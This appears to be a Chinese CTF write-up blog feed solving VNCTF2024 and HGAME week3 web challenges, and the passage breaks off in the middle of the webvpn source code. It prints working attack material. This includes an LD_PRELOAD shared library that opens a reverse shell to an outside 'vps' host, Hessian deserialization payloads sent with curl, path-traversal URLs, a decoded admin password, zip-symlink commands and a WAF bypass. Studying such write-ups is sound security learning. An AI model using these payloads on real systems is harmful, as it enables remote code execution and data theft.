    <content type="html"><![CDATA[<h1 id="VNCTF2024"><a href="#VNCTF2024" class="headerlink" title="VNCTF2024"></a>VNCTF2024</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>web 3&#x2F;8    …..完蛋了</p><p><img src="/../images/VNCTF2024/image-20240218163206298.png" alt="image-20240218163206298"></p><p><img src="/../images/VNCTF2024/image-20240218164437134.png" alt="image-20240218164437134"></p><p>givenphp和cutepath感觉就只差一点，但是就是不知道问题出在哪，烦死了</p><p>TEL✌也太强了，AK了web，真神仙啊</p><h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>js签到题</p><p><img src="/../images/VNCTF2024/image-20240218164747185.png" alt="image-20240218164747185"></p><p><img src="/../images/VNCTF2024/image-20240218164805153.png" alt="image-20240218164805153"></p><h2 id="TrySent"><a href="#TrySent" class="headerlink" title="TrySent"></a>TrySent</h2><p>SentCms，直接搜漏洞，找到个任意文件上传</p><p><code>/user/upload/upload</code>或<code>/admin/upload/upload</code></p><p><a href="https://blog.hanayuzu.top/articles/37dacab4.html">Sentcms任意文件上传漏洞 | Hanayuzu’Blog</a>参照文章复现即可</p><p>文章用的是jpg的图片马，但是由于jpg的格式问题，木马不是都能放进每张jpg图片，会在访问时出现问题</p><p>所以我改用png的图片马，真好用</p><p><img src="/../images/VNCTF2024/image-20240217170927101.png" alt="image-20240217170927101"></p><p><img src="/../images/VNCTF2024/image-20240217163307164.png" alt="image-20240217163307164"></p><h2 id="codefever-again"><a href="#codefever-again" class="headerlink" title="codefever_again"></a>codefever_again</h2><p>当时还在疑惑为什么是again，结束后看到大佬们都知道是西湖论剑2022的题，洞都没修</p><p>有意思的是在附件中藏在exp代码</p><p><img src="/../images/VNCTF2024/image-20240218165744071.png" alt="image-20240218165744071"></p><p>但是刚开始我看到反弹shell，我以为只是题目中某处要用，给个工具给我们利用一下</p><p>但是不知道他是干嘛的，然后去搜codefever的CVE</p><p>但其实在搜之前，我登陆了管理员账户，发现许多用户都在邮箱处进行利用</p><p><a href="https://www.viewofthai.link/2023/02/06/codefever-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">codefever 代码审计 – View of Thai</a></p><p><a href="https://github.com/PGYER/codefever/issues/140">The Codefeve before 2023.2.7-b1c2e7f has a Remote Command Execute Vulnerability · Issue #140 · PGYER&#x2F;codefever (github.com)</a></p><p>发现是email出了问题，这时我回过头来看了下这个代码，发现那不是一把梭脚本吗</p><p>直接启动</p><p><img src="/../images/VNCTF2024/image-20240217163242311.png" alt="image-20240217163242311"></p><p><img src="/../images/VNCTF2024/image-20240217163208288.png" alt="image-20240217163208288"></p><h2 id="givenphp"><a href="#givenphp" class="headerlink" title="givenphp"></a>givenphp</h2><p>除了checkin最先看的一题，当时的思路直接就是打<code>LD_PRELOAD</code>，有上传点，禁用了能够直接环境变量RCE的代码</p><p>思路这么明确，但是却一直打不通</p><p><img src="/../images/VNCTF2024/image-20240218170540368.png" alt="image-20240218170540368"></p><p>比赛结束后问了下Boogipop大佬</p><p><img src="/../images/VNCTF2024/image-20240219104201974.png" alt="image-20240219104201974"></p><h3 id="TEL✌WP"><a href="#TEL✌WP" class="headerlink" title="TEL✌WP"></a>TEL✌WP</h3><p>不需要 <code>unsetenv(&quot;LD_PRELOAD&quot;);</code>（感觉有点玄学，之前都需要的呀    </p><p>连TEL✌都在疑惑</p><p>so文件内容</p><div class="code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span><span class="hljs-type">char</span> *server_ip = <span class="hljs-string">&quot;vps&quot;</span>;<span class="hljs-type">uint32_t</span> server_port = <span class="hljs-number">114514</span>;<span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">reverse_shell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> __<span class="hljs-title">attribute__</span><span class="hljs-params">((constructor))</span></span>;<span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">reverse_shell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-type">int</span> sock = <span class="hljs-built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">sockaddr_in</span> attacker_addr = &#123;<span class="hljs-number">0</span>&#125;;    attacker_addr.sin_family = AF_INET;    attacker_addr.sin_port = <span class="hljs-built_in">htons</span>(server_port);    attacker_addr.sin_addr.s_addr = <span class="hljs-built_in">inet_addr</span>(server_ip);    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">connect</span>(sock, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;attacker_addr, <span class="hljs-built_in">sizeof</span>(attacker_addr)) != <span class="hljs-number">0</span>)        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);    <span class="hljs-built_in">dup2</span>(sock, <span class="hljs-number">0</span>);    <span class="hljs-built_in">dup2</span>(sock, <span class="hljs-number">1</span>);    <span class="hljs-built_in">dup2</span>(sock, <span class="hljs-number">2</span>);    <span class="hljs-built_in">execve</span>(<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs stylus">import requestsurl = <span class="hljs-string">&quot;http://d19a0faf-ab06-4db1-85a0-806d02bdeb2f.vnctf2024.manqiu.top:80/index.php&quot;</span>data = &#123;    <span class="hljs-string">&quot;upload&quot;</span>:<span class="hljs-number">1</span>&#125;file = &#123;    <span class="hljs-string">&quot;file&quot;</span>:<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;2.so&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)&#125;r = requests<span class="hljs-selector-class">.post</span>(url,data=data,files=file)<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(r.text[-<span class="hljs-number">45</span>:])</span></span>fn = r<span class="hljs-selector-class">.text</span><span class="hljs-selector-attr">[-45:]</span><span class="hljs-selector-class">.strip</span>()param = &#123;    <span class="hljs-string">&quot;challenge&quot;</span>:<span class="hljs-number">1</span>,    <span class="hljs-string">&quot;key&quot;</span>:<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>,    <span class="hljs-string">&quot;value&quot;</span>:fn,    <span class="hljs-string">&quot;guess&quot;</span>:<span class="hljs-string">&#x27;\x00lambda_1&#x27;</span>&#125;r = requests<span class="hljs-selector-class">.get</span>(url,params=param)<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(r.text)</span></span></code></pre></div><h3 id="p1ng师傅WP"><a href="#p1ng师傅WP" class="headerlink" title="p1ng师傅WP"></a>p1ng师傅WP</h3><p><img src="/../images/VNCTF2024/image-20240221003410654.png" alt="image-20240221003410654"></p><p>查看whoami调用的静态链接库</p><p>然后劫持函数</p><div class="code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">payload</span><span class="hljs-params">()</span> </span>&#123;                  <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;nl /*&quot;</span>);              &#125;              <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">fflush</span><span class="hljs-params">()</span> </span>&#123;                  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">getenv</span>(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>) == <span class="hljs-literal">NULL</span>) &#123; <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; &#125;                  <span class="hljs-built_in">unsetenv</span>(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);                  <span class="hljs-built_in">payload</span>();              &#125;</code></pre></div><p><img src="/../images/VNCTF2024/image-20240221011055707.png" alt="image-20240221011055707"></p><h3 id="官方WP"><a href="#官方WP" class="headerlink" title="官方WP"></a>官方WP</h3><p>别骂了别骂了</p><p><img src="/../images/VNCTF2024/image-20240221004827390.png" alt="image-20240221004827390"></p><p>也是劫持函数</p><p>噢，跟上面窜连起来了，上面劫持puts不成功是因为用了<code>unsetenv</code></p><h2 id="CutePath"><a href="#CutePath" class="headerlink" title="CutePath"></a>CutePath</h2><p>最有心无力的一集，直接发现了遍历任意目录的漏洞，但是就是一直不知道怎么去读<code>flag.txt</code>，唉，直接卡死</p><p>群友说是给<code>flag.txt</code>改名改到可下载的目录下，但是我也尝试过失败了（不知道咋改的</p><p><img src="/../images/VNCTF2024/image-20240219090225741.png" alt="image-20240219090225741"></p><p>TEL✌发现了个把文件目录打包的路由</p><p><img src="/../images/VNCTF2024/image-20240219090333407.png" alt="image-20240219090333407"></p><p>其实你上传一个目录后，点下载也能看到，服了，这么多按钮都试过了，偏偏漏了这个</p><div class="code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">/chfs/</span>downloaddir<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>flag.zip</code></pre></div><p><img src="/../images/VNCTF2024/image-20240219090112842.png" alt="image-20240219090112842"></p><h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><div class="code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">/chfs/</span>files?filepath=../&amp;_=<span class="hljs-number">12541315435</span></code></pre></div><p>发现base64，解密发现账号密码</p><div class="code-wrapper"><pre><code class="hljs kotlin">YWRtaW46Z2RnbS5lZHUuY25ATTFuOUsxbjlQQGFzadmin:gdgm.edu.<span class="hljs-symbol">cn@</span><span class="hljs-symbol">M1n9K1n9P@</span><span class="hljs-keyword">as</span></code></pre></div><p>登录之后能改名，burp抓包后，转到flag目录</p><div class="code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">/chfs/</span>files?filepath=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/flag/</span>flag&amp;_=<span class="hljs-number">12541315435</span></code></pre></div><p>对flag.txt进行改名，从而使它到可下载的目录</p><p>但不知道咋改。。。</p><p><img src="/../images/VNCTF2024/image-20240220235220828.png" alt="image-20240220235220828"></p><p>。。。忘记<code>home</code>了</p><h2 id="Zhi"><a href="#Zhi" class="headerlink" title="Zhi"></a>Zhi</h2><p>比赛结束前半小时看一看</p><p>ZhiCms，发现CVE，但是作者是赵总，他把文章给删了（呜呜呜，跟西湖论剑时一样，也是查到赵总的CVE，但是把文章给删了</p><p>这里只能根据漏洞描述自己打</p><p><img src="/../images/VNCTF2024/image-20240218171603559.png" alt="image-20240218171603559"></p><p>但是TEL✌好像是进入后台拿shell，太强了 （由于是0day，被锁了看不了</p><p>我上面的思路也是出题人想让我们打的</p><p><a href="https://pysnow.cn/archives/715/">VNCTF2024-ZhiCms &amp; CVE-2024-0603 - 我的文章记录 (pysnow.cn)</a></p><p>师傅太强了，回头再自己复现一下</p><h2 id="ezjob"><a href="#ezjob" class="headerlink" title="ezjob"></a>ezjob</h2><p>附件叫<code>xxl-job-admin-2.0.1.jar</code>，看完后像个cms（我把那种项目都叫cms</p><p>于是查漏洞</p><p>发现是xxl-job是个平台，分为admin和executor两端，然后查到几个漏洞，不知道有没有用</p><p>xxl-job 2.2.0的RCE</p><p>xxl-job &lt;2.1.2的Hessian反序列化</p><p>xxl-job &lt;&#x3D;2.0.2 hessian反序列化漏洞 （这个好像最贴近版本<a href="https://xz.aliyun.com/t/8456?time__1311=n4+xuDgDBDyDnDfxYqwxBqDwp003oeFpm+qID&alichlgref=https://www.bing.com/">xxl-job api未授权Hessian2反序列化 - 先知社区 (aliyun.com)</a></p><h3 id="TEL✌WP-1"><a href="#TEL✌WP-1" class="headerlink" title="TEL✌WP"></a>TEL✌WP</h3><p><a href="https://forum.butian.net/share/2592">https://forum.butian.net/share/2592</a></p><p>好啊，原来是我Boogipop大佬的文章</p><p>hessian反序列化</p><p>虽然是不出网，没法弹 shell，但是 dns 出网呀 （感觉好神奇</p><div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] args) throws <span class="hljs-keyword">Exception</span> &#123;    PKCS9Attributes pkcs9Attributes = SerializeUtils.createWithoutConstructor(PKCS9Attributes.<span class="hljs-keyword">class</span>);    UIDefaults uiDefaults = <span class="hljs-built_in">new</span> UIDefaults();    uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID,            <span class="hljs-built_in">new</span> SwingLazyValue(&quot;com.sun.org.apache.xml.internal.security.utils.JavaUtils&quot;, &quot;writeBytesToFilename&quot;,            <span class="hljs-built_in">new</span> <span class="hljs-keyword">Object</span>[]&#123;&quot;/tmp/tel1.xslt&quot;,SerializeUtils.getFileBytes(&quot;telll.xslt&quot;)&#125;));    SerializeUtils.setFieldValue(pkcs9Attributes,&quot;attributes&quot;,uiDefaults);    FileOutputStream fileOut = <span class="hljs-built_in">new</span> FileOutputStream(&quot;exp1.ser&quot;);    Hessian2Output <span class="hljs-keyword">out</span> = <span class="hljs-built_in">new</span> Hessian2Output(fileOut);    fileOut.<span class="hljs-keyword">write</span>(<span class="hljs-number">67</span>);    <span class="hljs-keyword">out</span>.getSerializerFactory().setAllowNonSerializable(<span class="hljs-keyword">true</span>);    <span class="hljs-keyword">out</span>.writeObject(pkcs9Attributes);    <span class="hljs-keyword">out</span>.<span class="hljs-keyword">close</span>();    fileOut.<span class="hljs-keyword">close</span>();&#125;<span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] args) throws <span class="hljs-keyword">Exception</span> &#123;PKCS9Attributes pkcs9Attributes = SerializeUtils.createWithoutConstructor(PKCS9Attributes.<span class="hljs-keyword">class</span>);    UIDefaults uiDefaults = <span class="hljs-built_in">new</span> UIDefaults();    uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, <span class="hljs-built_in">new</span> SwingLazyValue(&quot;com.sun.org.apache.xalan.internal.xslt.Process&quot;,            &quot;_main&quot;, <span class="hljs-built_in">new</span> <span class="hljs-keyword">Object</span>[]&#123;<span class="hljs-built_in">new</span> String[]&#123;&quot;-XT&quot;, &quot;-XSL&quot;, &quot;/tmp/tel1.xslt&quot;&#125;&#125;));    SerializeUtils.setFieldValue(pkcs9Attributes,&quot;attributes&quot;,uiDefaults);    FileOutputStream fileOut = <span class="hljs-built_in">new</span> FileOutputStream(&quot;exp2.ser&quot;);    Hessian2Output <span class="hljs-keyword">out</span> = <span class="hljs-built_in">new</span> Hessian2Output(fileOut);    fileOut.<span class="hljs-keyword">write</span>(<span class="hljs-number">67</span>);    <span class="hljs-keyword">out</span>.getSerializerFactory().setAllowNonSerializable(<span class="hljs-keyword">true</span>);    <span class="hljs-keyword">out</span>.writeObject(pkcs9Attributes);    <span class="hljs-keyword">out</span>.<span class="hljs-keyword">close</span>();    fileOut.<span class="hljs-keyword">close</span>();&#125;</code></pre></div><p>dns 外带，拼起来就是 flag 了，flag 在 <code>/flag_is_is_here</code>  (？这是咋知道的)</p><div class="code-wrapper"><pre><code class="hljs awk">curl -X POST -H <span class="hljs-string">&quot;Content-Type: x-application/hessian&quot;</span> --data-binary @exp1.ser http:<span class="hljs-regexp">//</span><span class="hljs-number">119.45</span>.<span class="hljs-number">241.186</span>:<span class="hljs-number">8989</span><span class="hljs-regexp">/xxl-job-admin/</span>apicurl -X POST -H <span class="hljs-string">&quot;Content-Type: x-application/hessian&quot;</span> --data-binary @exp2.ser http:<span class="hljs-regexp">//</span><span class="hljs-number">119.45</span>.<span class="hljs-number">241.186</span>:<span class="hljs-number">8989</span><span class="hljs-regexp">/xxl-job-admin/</span>api</code></pre></div><p><img src="/../images/VNCTF2024/image-20240219095603497.png" alt="image-20240219095603497"></p><p>看不懂</p><h2 id="downdowndown"><a href="#downdowndown" class="headerlink" title="downdowndown"></a>downdowndown</h2><p>附件看不了一点，就看懂个gunicorn，还不咋了解</p><h3 id="TEL✌WP-2"><a href="#TEL✌WP-2" class="headerlink" title="TEL✌WP"></a>TEL✌WP</h3><p>http3 访问</p><p>gunicorn 是以 HTTP&#x2F; 做截断的</p><p>这样子绕 waf</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> run --platform linux/amd64 --rm ymuski/curl-http3 curl -k --http3 https://<span class="hljs-number">119.45.241.186:2333</span>/GET%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>FFLAG%<span class="hljs-number">20</span>HTTP%<span class="hljs-number">2</span>F1.<span class="hljs-number">0</span>/public</code></pre></div><h2 id="问卷调查"><a href="#问卷调查" class="headerlink" title="问卷调查"></a>问卷调查</h2><p><img src="/../images/VNCTF2024/image-20240218164642596.png" alt="image-20240218164642596"></p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://mp.weixin.qq.com/s/f6hrKxrS-W-UjcC7fpTYvA">VNCTF2024-writeup (qq.com)</a></p><p><a href="https://l1nyz-tel.cc/2024/2/18/VNCTF2024-Writeup/">VNCTF2024 Writeup | TEL (l1nyz-tel.cc)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>HGAME-week3</title>
    <link href="/2024/02/17/HGAME-week3/"/>
    <url>/2024/02/17/HGAME-week3/</url>
    
    <content type="html"><![CDATA[<h1 id="HGAME-Week3"><a href="#HGAME-Week3" class="headerlink" title="HGAME-Week3"></a>HGAME-Week3</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>web 2&#x2F;3 太难了，真不会</p><p><img src="/../images/HGAME-week3/image-20240225220202843.png" alt="image-20240225220202843"></p><h2 id="Zero-Link-（二血"><a href="#Zero-Link-（二血" class="headerlink" title="Zero Link （二血"></a>Zero Link （二血</h2><p>三道题中，代码最多，但代码内容简单，目标明确，思路清晰</p><p>但是最后脑子抽了，secret文件忘记有代码了，后来一想到就出了（我造，我的一血没了</p><p><img src="/../images/HGAME-week3/image-20240216040715845.png" alt="image-20240216040715845"></p><p>几个路由，看完代码后很容易得到思路</p><p>&#x2F;user获取Admin用户密码去登陆，登录成Admin后上传zip文件</p><p>但这做了限制</p><p><img src="/../images/HGAME-week3/image-20240216040654976.png" alt="image-20240216040654976"></p><p>我们只需要键名不传username就行</p><p><img src="/../images/HGAME-week3/image-20240216030537054.png" alt="image-20240216030537054"></p><p>只能上传zip文件</p><p>然后是解压代码</p><p><img src="/../images/HGAME-week3/image-20240216041032153.png" alt="image-20240216041032153"></p><p>一看就知道是zip软链接的考点</p><p>通过软链接控制<code>/app</code></p><p>然后这里脑子抽了挺多风，尝试往&#x2F;app&#x2F;views下写go命令执行的文件，但解压失败</p><p>想着把secret文件软连接到&#x2F;flag，但也不行</p><p>最后想起了附件中有代码</p><p><img src="/../images/HGAME-week3/image-20240216030424378.png" alt="image-20240216030424378"></p><p><img src="/../images/HGAME-week3/image-20240216030439257.png" alt="image-20240216030439257"></p><p>直接覆盖secret文件内容为<code>/flag</code>即可</p><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s /app <span class="hljs-built_in">link</span>zip --symlinks link.zip <span class="hljs-built_in">link</span>删掉<span class="hljs-built_in">link</span><span class="hljs-built_in">mkdir</span> <span class="hljs-built_in">link</span><span class="hljs-built_in">cd</span> <span class="hljs-built_in">link</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/flag&quot;</span> &gt; secret<span class="hljs-built_in">cd</span> ..zip -r link1.zip ./*</code></pre></div><p>依次上传link.zip和link1.zip即可</p><p>然后访问<code>/api/unzip</code>，<code>/api/secret</code>即可</p><p><img src="/../images/HGAME-week3/image-20240216030337676.png" alt="image-20240216030337676"></p><h2 id="webvpn"><a href="#webvpn" class="headerlink" title="webvpn"></a>webvpn</h2><p>其实思路也是比较明确的</p><p>登陆后，使用&#x2F;user&#x2F;info路由进行原型链污染，污染strategy</p><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;express&quot;</span>);<span class="hljs-keyword">const</span> axios = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;axios&quot;</span>);<span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;body-parser&quot;</span>);<span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;path&quot;</span>);<span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;fs&quot;</span>);<span class="hljs-keyword">const</span> &#123; <span class="hljs-attr">v4</span>: uuidv4 &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;uuid&quot;</span>);<span class="hljs-keyword">const</span> session = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;express-session&quot;</span>);<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<span class="hljs-keyword">const</span> port = <span class="hljs-number">3000</span>;<span class="hljs-keyword">const</span> session_name = <span class="hljs-string">&quot;my-webvpn-session-id-&quot;</span> + <span class="hljs-title function_">uuidv4</span>().<span class="hljs-title function_">toString</span>();app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&quot;view engine&quot;</span>, <span class="hljs-string">&quot;pug&quot;</span>);app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&quot;trust proxy&quot;</span>, <span class="hljs-literal">false</span>);app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&quot;public&quot;</span>)));app.<span class="hljs-title function_">use</span>(  <span class="hljs-title function_">session</span>(&#123;    <span class="hljs-attr">name</span>: session_name,    <span class="hljs-attr">secret</span>: <span class="hljs-title function_">uuidv4</span>().<span class="hljs-title function_">toString</span>(),    <span class="hljs-attr">secure</span>: <span class="hljs-literal">false</span>,    <span class="hljs-attr">resave</span>: <span class="hljs-literal">false</span>,    <span class="hljs-attr">saveUninitialized</span>: <span class="hljs-literal">true</span>,  &#125;));app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">json</span>());<span class="hljs-keyword">var</span> userStorage = &#123;  <span class="hljs-attr">username</span>: &#123;    <span class="hljs-attr">password</span>: <span class="hljs-string">&quot;password&quot;</span>,    <span class="hljs-attr">info</span>: &#123;      <span class="hljs-attr">age</span>: <span class="hljs-number">18</span>,    &#125;,    <span class="hljs-attr">strategy</span>: &#123;      <span class="hljs-string">&quot;baidu.com&quot;</span>: <span class="hljs-literal">true</span>,      <span class="hljs-string">&quot;google.com&quot;</span>: <span class="hljs-literal">false</span>,    &#125;,  &#125;,&#125;;<span class="hljs-keyword">function</span> <span class="hljs-title function_">update</span>(<span class="hljs-params">dst, src</span>) &#123;  <span class="hljs-keyword">for</span> (key <span class="hljs-keyword">in</span> src) &#123;    <span class="hljs-keyword">if</span> (key.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;__&quot;</span>) != -<span class="hljs-number">1</span>) &#123;      <span class="hljs-keyword">continue</span>;    &#125;    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> src[key] == <span class="hljs-string">&quot;object&quot;</span> &amp;&amp; dst[key] !== <span class="hljs-literal">undefined</span>) &#123;      <span class="hljs-title function_">update</span>(dst[key], src[key]);      <span class="hljs-keyword">continue</span>;    &#125;    dst[key] = src[key];  &#125;&#125;app.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;/proxy&quot;</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; &#123;  <span class="hljs-keyword">const</span> &#123; username &#125; = req.<span class="hljs-property">session</span>;  <span class="hljs-keyword">if</span> (!username) &#123;    res.<span class="hljs-title function_">sendStatus</span>(<span class="hljs-number">403</span>);  &#125;  <span class="hljs-keyword">let</span> url = (<span class="hljs-function">() =&gt;</span> &#123;    <span class="hljs-keyword">try</span> &#123;      <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(req.<span class="hljs-property">query</span>.<span class="hljs-property">url</span>);    &#125; <span class="hljs-keyword">catch</span> &#123;      res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>);      res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;invalid url.&quot;</span>);      <span class="hljs-keyword">return</span> <span class="hljs-literal">undefined</span>;    &#125;  &#125;)();  <span class="hljs-keyword">if</span> (!url) <span class="hljs-keyword">return</span>;  <span class="hljs-keyword">if</span> (!userStorage[username].<span class="hljs-property">strategy</span>[url.<span class="hljs-property">hostname</span>]) &#123;    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>);    res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;your url is not allowed.&quot;</span>);  &#125;  <span class="hljs-keyword">try</span> &#123;    <span class="hljs-keyword">const</span> headers = req.<span class="hljs-property">headers</span>;    headers.<span class="hljs-property">host</span> = url.<span class="hljs-property">host</span>;    headers.<span class="hljs-property">cookie</span> = headers.<span class="hljs-property">cookie</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;;&quot;</span>).<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">cookie</span>) =&gt;</span> &#123;      <span class="hljs-keyword">var</span> filtered_cookie = <span class="hljs-string">&quot;&quot;</span>;      <span class="hljs-keyword">const</span> [key, value] = cookie.<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-number">1</span>);      <span class="hljs-keyword">if</span> (key.<span class="hljs-title function_">trim</span>() !== session_name) &#123;        filtered_cookie += <span class="hljs-string">`<span class="hljs-subst">$&#123;key&#125;</span>=<span class="hljs-subst">$&#123;value&#125;</span>;`</span>;      &#125;      <span class="hljs-keyword">return</span> filtered_cookie;    &#125;);    <span class="hljs-keyword">const</span> remote_res = <span class="hljs-keyword">await</span> (<span class="hljs-function">() =&gt;</span> &#123;      <span class="hljs-keyword">if</span> (req.<span class="hljs-property">method</span> == <span class="hljs-string">&quot;POST&quot;</span>) &#123;        <span class="hljs-keyword">return</span> axios.<span class="hljs-title function_">post</span>(url, req.<span class="hljs-property">body</span>, &#123;          <span class="hljs-attr">headers</span>: headers,        &#125;);      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (req.<span class="hljs-property">method</span> == <span class="hljs-string">&quot;GET&quot;</span>) &#123;        <span class="hljs-keyword">return</span> axios.<span class="hljs-title function_">get</span>(url, &#123;          <span class="hljs-attr">headers</span>: headers,        &#125;);      &#125; <span class="hljs-keyword">else</span> &#123;        res.<span class="hljs-title function_">status</span>(<span class="hljs-number">405</span>);        res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;method not allowed.&quot;</span>);        <span class="hljs-keyword">return</span>;      &#125;    &#125;)();    res.<span class="hljs-title function_">status</span>(remote_res.<span class="hljs-property">status</span>);    res.<span class="hljs-title function_">header</span>(remote_res.<span class="hljs-property">headers</span>);    res.<span class="hljs-title function_">write</span>(remote_res.<span class="hljs-property">data</span>);  &#125; <span class="hljs-keyword">catch</span> (e) &#123;    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>);    res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;unreachable url.&quot;</span>);  &#125;&#125;);app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/user/login&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;  <span class="hljs-keyword">const</span> &#123; username, password &#125; = req.<span class="hljs-property">body</span>;  <span class="hljs-keyword">if</span> (    <span class="hljs-keyword">typeof</span> username != <span class="hljs-string">&quot;string&quot;</span> ||    <span class="hljs-keyword">typeof</span> password != <span class="hljs-string">&quot;string&quot;</span> ||    !username ||    !password  ) &#123;    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>);    res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;invalid username or password&quot;</span>);    <span class="hljs-keyword">return</span>;  &#125;  <span class="hljs-keyword">if</span> (!userStorage[username]) &#123;    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>);    res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;invalid username or password&quot;</span>);    <span class="hljs-keyword">return</span>;  &#125;  <span class="hljs-keyword">if</span> (userStorage[username].<span class="hljs-property">password</span> !== password) &#123;    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>);    res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;invalid username or password&quot;</span>);    <span class="hljs-keyword">return</span>;  &#125;  req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span> = username;  res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;login success&quot;</span>);&#125;);<span class="hljs-comment">// under development</span>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/user/info&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;  <span class="hljs-keyword">if</span> (!req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span>) &#123;    res.<span class="hljs-title function_">sendStatus</span>(<span class="hljs-number">403</span>);  &#125;  <span class="hljs-title function_">update</span>(userStorage[req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span>].<span 